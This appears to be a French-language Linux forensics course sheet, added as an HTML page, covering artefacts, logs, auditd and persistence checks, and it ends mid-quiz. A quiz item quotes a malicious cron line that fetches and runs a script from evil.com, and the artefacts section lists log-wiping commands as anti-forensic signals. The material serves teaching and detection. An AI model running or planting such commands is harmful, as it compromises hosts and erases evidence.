@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Linux Forensique — CAS-IN Forensique</title>
+<meta name="description" content="Forensique Linux · /proc · journald · auditd · persistance · artefacts utilisateur · acquisition LiME">
+<meta name="theme-color" content="#0d1117">
+<link rel="stylesheet" href="../style/fiche_style.css">
+</head>
+<body>
+<div id="scroll-progress"></div>
+<button class="back-top" id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Haut de page">↑</button>
+
+<nav class="tn-nav" aria-label="Navigation fiche">
+  <a href="index.html" class="tn-back">← Fiches</a>
+  <span class="tn-title">LINUX FORENSIQUE</span>
+  <a href="../quiz.html" class="tn-quiz">💊 Quiz →</a>
+</nav>
+
+<div class="page-wrap">
+  <div class="breadcrumb">
+    <a href="../index.html">🏠 Accueil</a><span class="bc-sep">›</span>
+    <a href="index.html">Fiches</a><span class="bc-sep">›</span>
+    <a href="index.html#cat-systèmesspéciaux">Systèmes spéciaux</a><span class="bc-sep">›</span>
+    <span class="bc-current">Linux Forensique</span>
+    <span class="read-time-badge" style="margin-left:auto">⏱ ~12 min</span>
+  </div>
+
+  <div class="header" style="margin-top:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)">
+    <div><span style="font-size:2.2rem">🐧</span>
+    <span class="tag tag-gold" style="margin-left:.5rem">DFIR</span>
+    <span class="tag tag-green" style="margin-left:.3rem">Linux</span>
+    <span class="tag tag-blue" style="margin-left:.3rem">Serveurs</span></div>
+    <h1 style="font-family:var(--sans);font-size:2rem;font-weight:800;letter-spacing:-.5px;margin:.3rem 0 .15rem">Linux Forensique</h1>
+    <div class="meta">/proc · journald · auditd · authorized_keys · persistance · LiME · Volatility</div>
+  </div>
+
+  <div style="margin:1rem 0;padding:.9rem 1.25rem;background:rgba(0,229,204,.04);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;font-size:.82rem;line-height:1.65;color:var(--dim)">
+    <span style="color:var(--cyan);font-weight:700;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em">Fait notable</span><br>
+    <em style="color:var(--text)">"Linux est l'OS de prédilection des attaquants APT non pas parce qu'il est vulnérable, mais parce qu'il héberge 95 % des serveurs Internet — les cibles les plus précieuses — et que ses logs sont souvent mal configurés, voire désactivés."</em><br>
+    <span style="font-size:.72rem;margin-top:.3rem;display:block">— Hal Pomeranz, <em>Linux Forensics</em>, SANS FOR572, 2023</span>
+  </div>
+
+  <div style="margin:1rem 0;padding:.7rem 1rem;background:rgba(48,232,138,.05);border-left:3px solid var(--green);border-radius:0 8px 8px 0;font-size:.78rem;color:var(--dim)">
+    <span style="color:var(--green);font-weight:700">🇨🇭 Contexte suisse :</span> Les serveurs Linux sont omniprésents dans les administrations cantonales, les PME, les hôpitaux et les infrastructures critiques helvétiques (Postfinance, SBB IT, HES-SO). Le technicien DFIR suisse doit maîtriser Linux forensique autant que Windows — les incidents Xplain (2023) et NZZ impliquaient des systèmes Linux.
+  </div>
+
+  <div class="prereq-block" style="margin-top:1rem">
+    <div class="prereq-row"><span class="prereq-label">Prérequis :</span><a href="acquisition.html" class="prereq-pill">📖 Acquisition</a><a href="ext.html" class="prereq-pill">📖 EXT4</a><a href="mac_times.html" class="prereq-pill">📖 MAC Times</a></div>
+    <div class="prereq-row"><span class="prereq-label">Voir aussi :</span><a href="macos-linux.html" class="related-pill">🔗 macOS &amp; Linux (vue comparative)</a><a href="ram_forensique.html" class="related-pill">🔗 RAM Forensique</a><a href="logs_windows.html" class="related-pill">🔗 Logs Windows</a><a href="methodologie.html" class="related-pill">🔗 Méthodologie</a></div>
+  </div>
+</div>
+
+<!-- TABS -->
+<div class="tabs" id="linux-tabs">
+  <button class="tab active" onclick="showTab('artefacts',this)">🗂 Artefacts</button>
+  <button class="tab" onclick="showTab('logs',this)">📋 Logs &amp; Audit</button>
+  <button class="tab" onclick="showTab('persistance',this)">🔄 Persistance</button>
+  <button class="tab" onclick="showTab('proc',this)">⚙️ /proc &amp; mémoire</button>
+  <button class="tab" onclick="showTab('acquisition',this)">💾 Acquisition</button>
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 1 — ARTEFACTS
+══════════════════════════════════════════════ -->
+<div class="tab-page active" id="tab-artefacts">
+
+<div class="concept-card">
+  <div class="concept-title">🐧 Linux forensique — Philosophie "tout est fichier"</div>
+  Sur Linux, <strong>tout est exposé via le système de fichiers</strong> : les processus dans <code>/proc/</code>, les périphériques dans <code>/dev/</code>, les configurations dans <code>/etc/</code>, les logs dans <code>/var/log/</code>. Contrairement à Windows, il n'y a pas de registre centralisé — les artefacts sont dispersés en fichiers texte plats, bases SQLite et journaux binaires. <strong>Bonne nouvelle</strong> : beaucoup sont lisibles sans outils spécialisés. <strong>Mauvaise nouvelle</strong> : ils peuvent être effacés trivialmente (<code>history -c</code>, <code>shred</code>, <code>echo "" &gt; /var/log/auth.log</code>).
+</div>
+
+<!-- SVG Cartographie -->
+<div class="sec-title">Cartographie des artefacts Linux</div>
+<div class="sec-sub">Cliquez sur une catégorie pour afficher ses artefacts clés et leur valeur forensique.</div>
+
+<div style="background:rgba(48,232,138,.03);border:2px solid rgba(48,232,138,.25);border-radius:12px;padding:1rem;margin-bottom:.5rem">
+  <div style="font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--green);text-align:center;margin-bottom:.75rem;opacity:.8">🐧 Système de fichiers Linux — zones forensiques</div>
+  <div style="display:grid!important;grid-template-columns:repeat(3,1fr);gap:.5rem;margin-bottom:.5rem">
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(0,229,204,.4);text-align:center;cursor:pointer;background:rgba(0,229,204,.08);color:var(--cyan)" onclick="showArtZone('user')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">👤</span>
+      <div style="font-size:.72rem;font-weight:700">/home/ &amp; /root/</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">Shell history · dotfiles<br>SSH keys · Corbeille</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(240,192,64,.4);text-align:center;cursor:pointer;background:rgba(240,192,64,.08);color:var(--gold)" onclick="showArtZone('logs')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">📋</span>
+      <div style="font-size:.72rem;font-weight:700">/var/log/</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">auth.log · syslog<br>journal · audit.log</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(188,140,255,.4);text-align:center;cursor:pointer;background:rgba(188,140,255,.08);color:var(--purple)" onclick="showArtZone('etc')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">⚙️</span>
+      <div style="font-size:.72rem;font-weight:700">/etc/</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">passwd · shadow · cron<br>sudoers · hosts</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(255,64,96,.4);text-align:center;cursor:pointer;background:rgba(255,64,96,.08);color:var(--red)" onclick="showArtZone('tmp')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">⚡</span>
+      <div style="font-size:.72rem;font-weight:700">/tmp/ &amp; /dev/shm/</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">Zones volatiles<br>Malwares fileless</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(48,232,138,.4);text-align:center;cursor:pointer;background:rgba(48,232,138,.08);color:var(--green)" onclick="showArtZone('proc')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">🔬</span>
+      <div style="font-size:.72rem;font-weight:700">/proc/</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">Processus live<br>cmdline · maps · fd</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(88,166,255,.4);text-align:center;cursor:pointer;background:rgba(88,166,255,.08);color:var(--blue)" onclick="showArtZone('reseau')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">🌐</span>
+      <div style="font-size:.72rem;font-weight:700">Réseau</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">ss · netstat · iptables<br>/proc/net/tcp</div>
+    </div>
+
+  </div>
+</div>
+
+<div class="arch-detail" id="art-zone-detail" style="margin-bottom:1rem">
+  <div style="color:var(--dim);font-size:.78rem">ℹ️ Sélectionnez une zone ci-dessus pour afficher ses artefacts forensiques</div>
+</div>
+
+<!-- Table artefacts utilisateur -->
+<div class="sec-title">Artefacts utilisateur — table de référence</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Artefact</th><th>Chemin</th><th>Valeur forensique</th><th>Volatil ?</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">.bash_history</td>
+      <td style="font-family:var(--mono);font-size:.68rem">~/.bash_history</td>
+      <td>Historique complet des commandes. Effaçable via <code>history -c</code> ou <code>HISTSIZE=0</code>. Chercher aussi <code>.zsh_history</code>, <code>.sh_history</code>.</td>
+      <td style="color:var(--red);font-size:.72rem">⚠ Oui</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">.bash_profile / .bashrc</td>
+      <td style="font-family:var(--mono);font-size:.68rem">~/.bashrc<br>~/.bash_profile</td>
+      <td>Scripts exécutés à l'ouverture de session. <strong>Vecteur de persistance majeur</strong> : alias malveillants, reverse shell, export PATH modifié.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">authorized_keys</td>
+      <td style="font-family:var(--mono);font-size:.68rem">~/.ssh/authorized_keys</td>
+      <td><strong>Persistence SSH silencieuse</strong> : ajout d'une clé publique = accès permanent sans mot de passe. Vérifier la date de modification du fichier.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">known_hosts</td>
+      <td style="font-family:var(--mono);font-size:.68rem">~/.ssh/known_hosts</td>
+      <td>Liste des serveurs SSH contactés (empreintes). Révèle les cibles d'une attaque de rebond ou les serveurs utilisés pour l'exfiltration.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">.viminfo / .lesshst</td>
+      <td style="font-family:var(--mono);font-size:.68rem">~/.viminfo</td>
+      <td>Historique des fichiers ouverts avec vim, less, nano. Révèle les fichiers consultés même après suppression.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">Corbeille XDG</td>
+      <td style="font-family:var(--mono);font-size:.68rem">~/.local/share/Trash/<br>files/ &amp; info/</td>
+      <td>Fichiers supprimés via interface graphique. Le sous-dossier <code>info/</code> contient les métadonnées (chemin d'origine, date de suppression) au format .trashinfo.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">/etc/passwd &amp; shadow</td>
+      <td style="font-family:var(--mono);font-size:.68rem">/etc/passwd<br>/etc/shadow</td>
+      <td><code>passwd</code> : liste des comptes (UID, GID, shell, home). <code>shadow</code> : hashes (root seul). Chercher UID 0 non-root = backdoor, shell non-standard = compte de service détourné.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.75rem;color:var(--cyan)">wtmp / btmp / lastlog</td>
+      <td style="font-family:var(--mono);font-size:.68rem">/var/log/wtmp<br>/var/log/btmp<br>/var/log/lastlog</td>
+      <td><code>wtmp</code> : toutes les connexions/déconnexions (<code>last</code>). <code>btmp</code> : tentatives échouées (<code>lastb</code>). <code>lastlog</code> : dernière connexion par compte. Effacement = signe d'anti-forensique.</td>
+      <td style="color:var(--green);font-size:.72rem">✓ Non</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>🔍 Commandes de triage rapide</h4>
+    <ul class="memo-list">
+      <li><code>last -f /var/log/wtmp</code> — historique connexions</li>
+      <li><code>lastb -f /var/log/btmp</code> — tentatives échouées</li>
+      <li><code>find / -mtime -7 -type f 2&gt;/dev/null</code> — fichiers modifiés &lt; 7j</li>
+      <li><code>find / -perm -4000 -type f 2&gt;/dev/null</code> — binaires SUID</li>
+      <li><code>awk -F: '($3==0){print}' /etc/passwd</code> — UID 0 = root</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>⚠️ Signaux d'anti-forensique Linux</h4>
+    <ul class="memo-list">
+      <li><code>HISTFILE=/dev/null</code> ou <code>HISTSIZE=0</code> dans .bashrc</li>
+      <li><code>shred -u</code> sur des fichiers — écrasement sécurisé</li>
+      <li>wtmp/btmp/auth.log vidés ou tronqués</li>
+      <li>Timestamp <code>mtime</code> modifié via <code>touch -t</code></li>
+      <li>Binaire avec nom légitime dans <code>/tmp/</code> ou <code>/dev/shm/</code></li>
+    </ul>
+  </div>
+</div>
+</div><!-- /tab-artefacts -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 2 — LOGS & AUDIT
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-logs">
+
+<div class="sec-title">Architecture des logs Linux — deux systèmes coexistent</div>
+
+<div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.65rem;margin:.75rem 0">
+  <div class="card card-blue">
+    <div class="ct">📋 Syslog classique — /var/log/</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>Format :</strong> texte brut, lisible directement<br>
+      <strong>Outil :</strong> <code>grep</code>, <code>awk</code>, <code>tail -f</code><br>
+      <strong>Rotation :</strong> logrotate (compresse en .gz)<br>
+      <strong>Risque :</strong> effaçable par root (<code>echo "" &gt; auth.log</code>)<br>
+      <strong>Fichiers clés :</strong> auth.log, syslog, kern.log, apache2/
+    </div>
+  </div>
+  <div class="card card-green">
+    <div class="ct">🔵 systemd-journald — binaire</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>Format :</strong> binaire structuré, indexé<br>
+      <strong>Outil :</strong> <code>journalctl</code> (filtres puissants)<br>
+      <strong>Stockage :</strong> /var/log/journal/ (persistant) ou /run/log/journal/ (volatile)<br>
+      <strong>Intégrité :</strong> FSS (Forward Secure Sealing) optionnel<br>
+      <strong>Avantage :</strong> métadonnées enrichies (PID, UID, COMM)
+    </div>
+  </div>
+</div>
+
+<!-- Table logs clés -->
+<div class="sec-title">Fichiers de logs clés — référence forensique</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Fichier</th><th>Contenu</th><th>Requête forensique typique</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">/var/log/auth.log</td>
+      <td style="font-size:.75rem">Authentifications SSH, sudo, su, PAM. <strong>Valeur forensique maximale.</strong></td>
+      <td style="font-family:var(--mono);font-size:.65rem"><code>grep "Failed password" auth.log</code><br><code>grep "Accepted publickey" auth.log</code></td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">/var/log/syslog</td>
+      <td style="font-size:.75rem">Logs système généraux, kernel, services (cron, rsyslog). Sur RHEL/CentOS : <code>/var/log/messages</code></td>
+      <td style="font-family:var(--mono);font-size:.65rem"><code>grep "cron" syslog</code><br><code>grep "OOM" syslog</code></td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">/var/log/kern.log</td>
+      <td style="font-size:.75rem">Messages du noyau. Modules chargés (rootkits), erreurs matérielles, USB events.</td>
+      <td style="font-family:var(--mono);font-size:.65rem"><code>grep "USB" kern.log</code><br><code>grep "module" kern.log</code></td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">/var/log/audit/audit.log</td>
+      <td style="font-size:.75rem">Appels système audités par <strong>auditd</strong>. Le log forensique le plus riche si configuré. Syscalls, accès fichiers, execve(), connexions.</td>
+      <td style="font-family:var(--mono);font-size:.65rem"><code>ausearch -m execve --start today</code><br><code>aureport --login</code></td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">/var/log/apache2/<br>/var/log/nginx/</td>
+      <td style="font-size:.75rem">Accès et erreurs web. Souvent oubliés par les attaquants. Révèle exploitation, webshell, LFI/RFI.</td>
+      <td style="font-family:var(--mono);font-size:.65rem"><code>grep "POST" access.log</code><br><code>grep "cmd=" access.log</code></td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--gold)">/var/log/dpkg.log<br>/var/log/yum.log</td>
+      <td style="font-size:.75rem">Historique des installations de paquets. Révèle les outils installés par l'attaquant (nmap, netcat, socat...).</td>
+      <td style="font-family:var(--mono);font-size:.65rem"><code>grep "install" dpkg.log</code><br><code>rpm -qa --last</code></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- journalctl cheat sheet -->
+<div class="sec-title">journalctl — Commandes forensiques essentielles</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+  <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-bottom:.75rem;letter-spacing:.05em">JOURNALCTL — FILTRES FORENSIQUES COURANTS</div>
+  <div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.5rem">
+    <div style="background:rgba(0,229,204,.04);border:1px solid rgba(0,229,204,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--cyan);font-weight:700;margin-bottom:.35rem">🕐 Par plage temporelle</div>
+      <code style="font-size:.67rem;color:var(--text);line-height:1.8;display:block">journalctl --since "2024-03-15 08:00" --until "2024-03-15 18:00"<br>journalctl --since "yesterday"<br>journalctl --since "-2h"</code>
+    </div>
+    <div style="background:rgba(240,192,64,.04);border:1px solid rgba(240,192,64,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--gold);font-weight:700;margin-bottom:.35rem">🔍 Par service / priorité</div>
+      <code style="font-size:.67rem;color:var(--text);line-height:1.8;display:block">journalctl -u sshd --no-pager<br>journalctl -u cron -p err<br>journalctl -u nginx --since "today"</code>
+    </div>
+    <div style="background:rgba(188,140,255,.04);border:1px solid rgba(188,140,255,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--purple);font-weight:700;margin-bottom:.35rem">👤 Par utilisateur / processus</div>
+      <code style="font-size:.67rem;color:var(--text);line-height:1.8;display:block">journalctl _UID=1000<br>journalctl _COMM=bash<br>journalctl _PID=1337</code>
+    </div>
+    <div style="background:rgba(48,232,138,.04);border:1px solid rgba(48,232,138,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--green);font-weight:700;margin-bottom:.35rem">📤 Export &amp; analyse</div>
+      <code style="font-size:.67rem;color:var(--text);line-height:1.8;display:block">journalctl -o json-pretty<br>journalctl -o export &gt; journal.bin<br>journalctl --disk-usage</code>
+    </div>
+  </div>
+</div>
+
+<!-- auditd section -->
+<div class="sec-title">auditd — Surveillance syscall niveau kernel</div>
+<div class="alert">
+  🎯 <strong>auditd</strong> est le système d'audit Linux le plus puissant pour la forensique. Configuré correctement, il enregistre chaque <code>execve()</code> (exécution de commande), chaque accès à un fichier sensible, chaque connexion réseau. <strong>Il n'est pas actif par défaut sur toutes les distributions.</strong> Sa présence ou absence est elle-même un indicateur forensique.
+</div>
+
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Type d'événement</th><th>Champ audit</th><th>Valeur forensique</th></tr></thead>
+  <tbody>
+    <tr><td style="font-family:var(--mono);font-size:.72rem">SYSCALL</td><td style="font-family:var(--mono);font-size:.7rem">type=SYSCALL</td><td style="font-size:.75rem">Chaque appel système : <code>execve</code>, <code>open</code>, <code>connect</code>, <code>unlink</code>. Avec UID réel et UID effectif (détecte sudo).</td></tr>
+    <tr><td style="font-family:var(--mono);font-size:.72rem">EXECVE</td><td style="font-family:var(--mono);font-size:.7rem">type=EXECVE</td><td style="font-size:.75rem">Arguments complets de la commande exécutée. Indispensable pour reconstituer les actions d'un attaquant.</td></tr>
+    <tr><td style="font-family:var(--mono);font-size:.72rem">USER_LOGIN</td><td style="font-family:var(--mono);font-size:.7rem">type=USER_LOGIN</td><td style="font-size:.75rem">Chaque connexion réussie ou échouée avec timestamp précis.</td></tr>
+    <tr><td style="font-family:var(--mono);font-size:.72rem">PATH</td><td style="font-family:var(--mono);font-size:.7rem">type=PATH</td><td style="font-size:.75rem">Fichier accédé ou modifié lors du syscall. Inclut le chemin complet et l'inode.</td></tr>
+    <tr><td style="font-family:var(--mono);font-size:.72rem">NETFILTER_PKT</td><td style="font-family:var(--mono);font-size:.7rem">type=NETFILTER</td><td style="font-size:.75rem">Paquets réseau filtrés — révèle les connexions bloquées ou suspectes.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>🔎 ausearch — requêtes forensiques</h4>
+    <ul class="memo-list">
+      <li><code>ausearch -m execve --start 03/15/2024 --end 03/16/2024</code></li>
+      <li><code>ausearch -ua 0 -m USER_LOGIN</code> — connexions root</li>
+      <li><code>ausearch -f /etc/passwd</code> — accès au fichier passwd</li>
+      <li><code>aureport --login --summary</code> — résumé connexions</li>
+      <li><code>aureport --executable --summary</code> — exécutables lancés</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>📍 Localiser les journaux sur image disque</h4>
+    <ul class="memo-list">
+      <li>Logs texte : <code>/var/log/*.log</code> et <code>*.log.[0-9].gz</code></li>
+      <li>Journal systemd : <code>/var/log/journal/&lt;machine-id&gt;/</code></li>
+      <li>Audit : <code>/var/log/audit/audit.log*</code></li>
+      <li>Parser hors-ligne : <code>journalctl -D /mnt/journal/</code></li>
+      <li>Rotation : chercher aussi <code>/var/log/syslog.1</code>, <code>.2.gz</code>…</li>
+    </ul>
+  </div>
+</div>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Exam Tip — Logs Linux</div>
+  <p><strong>auth.log</strong> = authentifications SSH/sudo · <strong>syslog</strong> = logs généraux · <strong>audit.log</strong> = syscalls kernel</p>
+  <p><strong>journalctl</strong> lit les journaux binaires systemd — les logs texte /var/log/ coexistent séparément</p>
+  <p><strong>Priorité d'acquisition</strong> : wtmp + btmp + auth.log + audit.log + bash_history <em>avant</em> de couper la machine</p>
+  <p><strong>Signal d'alerte</strong> : auth.log vide ou tronqué alors que le système tourne depuis des semaines → anti-forensique</p>
+</div>
+</div><!-- /tab-logs -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 3 — PERSISTANCE
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-persistance">
+
+<div class="concept-card">
+  <div class="concept-title">🔄 Persistance Linux — mécanismes et artefacts</div>
+  Linux offre de nombreux points de persistance légitimes détournables. Contrairement à Windows qui centralise tout dans le Registre, <strong>les mécanismes Linux sont dispersés</strong> dans des dizaines de fichiers et répertoires. Un attaquant peut maintenir un accès permanent sans modifier un seul binaire système. La clé est de connaître <em>tous</em> les emplacements à vérifier.
+</div>
+
+<!-- Table persistance cliquable -->
+<div class="sec-title">Mécanismes de persistance — Cliquez pour les détails</div>
+<div style="display:grid!important;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:.55rem;margin:.75rem 0">
+
+  <div class="meta-card mc-0" onclick="showPersist('cron')">
+    <div class="meta-num">Niveau 1</div>
+    <div class="meta-name">Cron / Crontab</div>
+    <div class="meta-desc">Tâches planifiées utilisateur et système.</div>
+  </div>
+
+  <div class="meta-card mc-1" onclick="showPersist('systemd')">
+    <div class="meta-num">Niveau 2</div>
+    <div class="meta-name">systemd Units</div>
+    <div class="meta-desc">Services au démarrage — très discrète.</div>
+  </div>
+
+  <div class="meta-card mc-2" onclick="showPersist('ssh')">
+    <div class="meta-num">Niveau 3</div>
+    <div class="meta-name">SSH authorized_keys</div>
+    <div class="meta-desc">Accès permanent sans mot de passe.</div>
+  </div>
+
+  <div class="meta-card mc-3" onclick="showPersist('bashrc')">
+    <div class="meta-num">Niveau 4</div>
+    <div class="meta-name">.bashrc / .profile</div>
+    <div class="meta-desc">Exécution à chaque shell utilisateur.</div>
+  </div>
+
+  <div class="meta-card mc-5" onclick="showPersist('suid')">
+    <div class="meta-num">Niveau 5</div>
+    <div class="meta-name">SUID / sudo</div>
+    <div class="meta-desc">Privilège élevé via binaire modifié.</div>
+  </div>
+
+  <div class="meta-card mc-6" onclick="showPersist('ld')">
+    <div class="meta-num">Niveau 6</div>
+    <div class="meta-name">LD_PRELOAD / libs</div>
+    <div class="meta-desc">Injection dans tous les processus.</div>
+  </div>
+
+  <div class="meta-card mc-7" onclick="showPersist('init')">
+    <div class="meta-num">Niveau 7</div>
+    <div class="meta-name">rc.local / init.d</div>
+    <div class="meta-desc">Scripts d'init legacy encore présents.</div>
+  </div>
+
+  <div class="meta-card mc-usn" onclick="showPersist('rootkit')">
+    <div class="meta-num">Niveau 8</div>
+    <div class="meta-name">Rootkit / LKM</div>
+    <div class="meta-desc">Module noyau — furtivité maximale.</div>
+  </div>
+
+</div>
+<div class="meta-detail" id="persist-detail"></div>
+
+<!-- Timeline persistance -->
+<div class="sec-title">Vérification rapide — Checklist persistance Linux</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+
+  <div style="margin-bottom:.75rem">
+    <div style="font-size:.65rem;color:var(--cyan);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">1. Comptes utilisateurs suspects</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      awk -F: '($3==0){print "UID 0: "$1}' /etc/passwd<br>
+      awk -F: '($7 !~ /nologin|false/){print $1" shell:"$7}' /etc/passwd<br>
+      cat /etc/sudoers | grep -v "^#"
+    </code>
+  </div>
+
+  <div style="margin-bottom:.75rem;padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--gold);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">2. Cron / tâches planifiées</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2&gt;/dev/null; done<br>
+      ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /var/spool/cron/crontabs/<br>
+      cat /etc/crontab
+    </code>
+  </div>
+
+  <div style="margin-bottom:.75rem;padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--purple);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">3. Services systemd non standard</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      systemctl list-units --type=service --state=running<br>
+      find /etc/systemd/ /usr/lib/systemd/ -name "*.service" -newer /bin/bash<br>
+      find ~/.config/systemd/ -name "*.service" 2&gt;/dev/null
+    </code>
+  </div>
+
+  <div style="margin-bottom:.75rem;padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--green);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">4. SSH keys &amp; fichiers de config</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      find /root /home -name "authorized_keys" -exec ls -la {} \;<br>
+      find /root /home -name "authorized_keys" -exec cat {} \;<br>
+      cat /etc/ssh/sshd_config | grep -E "PermitRoot|AuthorizedKeys|Port"
+    </code>
+  </div>
+
+  <div style="padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--red);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">5. Binaires SUID &amp; modules noyau</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      find / -perm -4000 -type f 2&gt;/dev/null | sort<br>
+      lsmod | grep -v "^Module"<br>
+      find /lib/modules/ -name "*.ko" -newer /boot/vmlinuz* 2&gt;/dev/null
+    </code>
+  </div>
+
+</div>
+
+<div class="key-fact">
+  <div class="key-fact-label">🎯 Cas réel — Vecteur de persistance Xplain (2023, contexte suisse)</div>
+  <div style="font-size:.78rem;line-height:1.75;margin-top:.4rem;color:var(--muted)">
+    L'incident Xplain (prestataire IT de la Confédération suisse) a impliqué un ransomware Play ayant compromis des serveurs Linux et Windows. Les investigations ont révélé des <strong>clés SSH non autorisées</strong> et des <strong>scripts cron malveillants</strong> comme mécanismes de persistance, permettant aux attaquants de maintenir leur accès plusieurs semaines avant le déclenchement du ransomware. Les logs auditd n'étaient pas activés sur les systèmes Linux compromis — limitant fortement la reconstruction de la timeline.
+  </div>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Un administrateur constate que <code>/etc/cron.d/update</code> exécute toutes les 5 minutes <code>curl http://evil.com/shell.sh | bash</code>. Quels artefacts permettent de dater la création de ce fichier ?<small>Persistance · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">
